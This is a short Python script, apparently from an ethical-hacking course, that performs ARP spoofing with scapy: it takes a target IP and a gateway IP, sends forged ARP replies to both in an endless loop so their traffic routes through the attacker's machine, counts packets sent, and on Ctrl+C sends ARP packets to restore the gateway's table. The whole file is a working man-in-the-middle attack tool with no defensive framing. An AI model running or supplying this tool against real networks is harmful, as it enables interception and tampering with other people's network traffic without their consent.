import argparse
import sys
import network_scanner
import scapy.all as scapy


def get_arguments():
    parser = argparse.ArgumentParser(description="Create an spoofing ARP request to the targeted ip by the gateway ip specified")
    parser.add_argument("-t", "--target", dest="target", help="Target IP.")
    parser.add_argument("-gip", "--gateway_ip", dest="gateway", help="Gateway IP.")
    arguments = parser.parse_args()
    if arguments.target == "":
        print('argument missing')
        exit()

    return arguments


def spoof(target_ip, spoof_ip):
    mac_address = network_scanner.get_mac_by_ip(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, source_ip):
    destination_mac = network_scanner.get_mac_by_ip(target_ip)
    source_mac = network_scanner.get_mac_by_ip(source_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packet_count = 0
args = get_arguments()

try:
    while True:
        spoof(args.target, args.gateway)
        spoof(args.gateway, args.target)
        sent_packet_count += 2
        sys.stdout.write("\r[+] Packets sent: " + str(sent_packet_count)),
        sys.stdout.flush()
except KeyboardInterrupt:
    print('\n[+] Detected CTRL + C ..... Resetting ARP tables please wait.')
    restore(args.gateway, args.target)

